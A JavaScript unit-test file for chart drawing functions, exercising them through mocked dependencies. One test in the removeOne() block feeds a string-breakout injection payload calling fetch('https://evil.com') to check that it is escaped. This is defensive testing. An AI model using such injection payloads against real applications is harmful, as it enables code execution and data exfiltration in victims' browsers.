/**
 * Tests for drawing core functions that operate via getChartApi().
 * Regression guard: listDrawings/getProperties/removeOne/clearAll previously
 * referenced bare `getChartApi`/`evaluate` (imported under aliased names),
 * which threw "getChartApi is not defined" at runtime. These tests drive the
 * functions through mocked _deps so the wiring is exercised offline.
 *
 * Run: node --test tests/drawing.test.js
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { safeString } from '../src/connection.js';
import { listDrawings, getProperties, removeOne, clearAll } from '../src/core/drawing.js';

function mockDeps(evalImpl) {
  const calls = [];
  const evaluate = async (expr) => { calls.push(expr); return evalImpl ? evalImpl(expr) : undefined; };
  evaluate.calls = calls;
  return { _deps: { evaluate, getChartApi: async () => 'window.__api' }, evaluate };
}

describe('listDrawings()', () => {
  it('resolves deps without ReferenceError and returns a count', async () => {
    const { _deps, evaluate } = mockDeps(() => [{ id: 'a', name: 'Rectangle' }, { id: 'b', name: 'Trend Line' }]);
    const r = await listDrawings({ _deps });
    assert.equal(r.success, true);
    assert.equal(r.count, 2);
    assert.ok(evaluate.calls[0].includes('getAllShapes'), 'queries shapes via the chart api');
    assert.ok(evaluate.calls[0].includes('window.__api'), 'uses the resolved api path');
  });

  it('handles an empty chart', async () => {
    const { _deps } = mockDeps(() => []);
    const r = await listDrawings({ _deps });
    assert.equal(r.count, 0);
    assert.deepEqual(r.shapes, []);
  });
});

describe('removeOne()', () => {
  it('uses safeString for entity_id and reports removal', async () => {
    const { _deps, evaluate } = mockDeps(() => ({ removed: true, entity_id: 'C6Ht4h', remaining_shapes: 6 }));
    const r = await removeOne({ entity_id: 'C6Ht4h', _deps });
    assert.equal(r.success, true);
    assert.equal(r.removed, true);
    assert.equal(r.remaining_shapes, 6);
    assert.ok(evaluate.calls[0].includes(safeString('C6Ht4h')), 'entity_id passed via safeString');
    assert.ok(evaluate.calls[0].includes('removeEntity'), 'calls removeEntity');
  });

  it('throws when the shape is not found', async () => {
    const { _deps } = mockDeps(() => ({ removed: false, error: 'Shape not found: zzz', available: [] }));
    await assert.rejects(() => removeOne({ entity_id: 'zzz', _deps }), /Shape not found: zzz/);
  });

  it('sanitizes an injection payload in entity_id', async () => {
    const { _deps, evaluate } = mockDeps(() => ({ removed: true, entity_id: 'x' }));
    const payload = "'); fetch('https://evil.com'); ('";
    await removeOne({ entity_id: payload, _deps });
    assert.ok(evaluate.calls[0].includes(safeString(payload)), 'payload is JSON-escaped');
  });
});

describe('getProperties()', () => {
  it('returns properties for an existing shape', async () => {
    const { _deps, evaluate } = mockDeps(() => ({ entity_id: 'a', name: 'Rectangle', visible: true }));
    const r = await getProperties({ entity_id: 'a', _deps });
    assert.equal(r.success, true);
    assert.equal(r.name, 'Rectangle');
    assert.ok(evaluate.calls[0].includes(safeString('a')), 'entity_id via safeString');
  });

  it('throws when the shape lookup returns an error', async () => {
    const { _deps } = mockDeps(() => ({ error: 'Shape not found: a' }));
    await assert.rejects(() => getProperties({ entity_id: 'a', _deps }), /Shape not found/);
  });
});

describe('clearAll()', () => {
  it('calls removeAllShapes via the resolved api path', async () => {
    const { _deps, evaluate } = mockDeps();
    const r = await clearAll({ _deps });
    assert.equal(r.success, true);
    assert.equal(r.action, 'all_shapes_removed');
    assert.ok(evaluate.calls[0].includes('window.__api.removeAllShapes()'), 'clears all shapes');
  });
});
